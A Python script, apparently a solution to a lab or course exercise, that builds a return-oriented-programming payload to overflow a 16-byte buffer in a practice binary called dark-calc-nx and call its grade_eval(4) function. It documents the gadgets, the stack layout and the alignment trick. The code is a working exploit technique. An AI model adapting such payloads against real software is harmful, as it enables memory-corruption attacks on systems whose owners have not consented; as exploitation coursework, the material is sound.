#!/usr/bin/env python3
"""Task 3 -- ROP against attack/dark-calc-nx (NX stack, ASLR, non-PIE).

dark-calc-nx has no fixed stack and its stack is not executable, so the only thing
that is stable is the .text section of a non-PIE binary.  We reuse the classic
__libc_csu_init gadgets to build a chain that calls grade_eval(4):

    0x401a33  pop rdi ; ret     (misaligned: the "41 5f" of "pop r15 ; ret")
    0x401731  ret               (alignment filler)
    0x401978  grade_eval
    0x4016e0  exit@plt

input()'s frame:  expression[16] | saved rbp | return address
"""
import sys
import struct

RET = 0x401731              # plain "ret", fixes the 16-byte stack alignment
POP_RDI_RET = 0x401A33      # "5f c3", i.e. inside "pop r15 ; ret" of __libc_csu_init
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0

p64 = lambda x: struct.pack("<Q", x)

payload = b"A" * 16                        # expression[16]
payload += p64(0xDEADBEEFDEADBEEF)         # saved rbp
payload += p64(RET)                        # alignment filler
payload += p64(POP_RDI_RET)
payload += p64(4)                          # rdi = 4  -> grade_eval(4)
payload += p64(GRADE_EVAL)
payload += p64(EXIT_PLT)                   # exit() once grade_eval() returned

assert b"\n" not in payload
sys.stdout.buffer.write(payload)
